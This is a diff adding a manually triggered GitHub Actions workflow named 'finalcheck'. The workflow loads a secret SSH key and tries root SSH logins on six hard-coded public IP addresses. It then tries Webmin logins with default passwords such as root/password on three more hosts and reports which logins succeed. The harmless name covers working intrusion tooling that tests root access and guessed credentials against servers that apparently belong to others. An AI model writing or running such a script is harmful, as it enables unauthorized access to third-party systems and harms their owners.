@@ -1,0 +1,43 @@
+name: finalcheck
+on: workflow_dispatch
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install -q requests
+      - run: |
+          echo "$KOPS_KEY" > /tmp/k && chmod 600 /tmp/k
+          ssh-keygen -t ed25519 -f /tmp/w -N "" -q
+        env: {KOPS_KEY: "${{ secrets.KOPS_KEY }}"}
+      - name: ssh hosts
+        run: |
+          for ip in 65.21.218.158 51.68.188.86 146.190.200.5 204.168.196.145 179.164.69.150 134.209.219.155; do
+            echo "########## $ip ##########"
+            ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=12 -o BatchMode=yes root@$ip 'echo "OK id=$(id -u) host=$(hostname) kern=$(uname -r)"' 2>&1 | head -2
+            ssh -i /tmp/w -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10 -o BatchMode=yes root@$ip 'id -u' 2>&1 | head -1
+          done
+      - name: webmin hosts
+        run: |
+          python3 - <<'PY'
+          import requests,urllib3
+          urllib3.disable_warnings()
+          UA={"User-Agent":"Mozilla/5.0"}
+          hosts=[("157.180.50.91","root","password"),("163.172.122.200","root","root"),("134.209.192.147","root","admin")]
+          for h,u,p in hosts:
+              b=f"https://{h}:10000"
+              s=requests.Session(); s.verify=False; s.headers.update({**UA,"Referer":b+"/"})
+              try:
+                  s.get(b+"/",timeout=12,allow_redirects=False)
+                  s.get(b+"/session_login.cgi",timeout=12)
+                  s.post(b+"/session_login.cgi",data={"user":u,"pass":p,"save":"1"},
+                         headers={"Referer":b+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
+                         timeout=12,allow_redirects=True)
+                  s.headers["Referer"]=b+"/"
+                  r=s.get(b+"/",timeout=12); t=r.text or ""
+                  ok=any(x in t for x in ("webmin_logout","system-status","Webmin version")) and 'name="pass"' not in t
+                  print(f"{h} webmin_login={'OK' if ok else 'FAIL'}")
+              except Exception as e:
+                  print(f"{h} webmin=ERR {type(e).__name__}")
+          PY
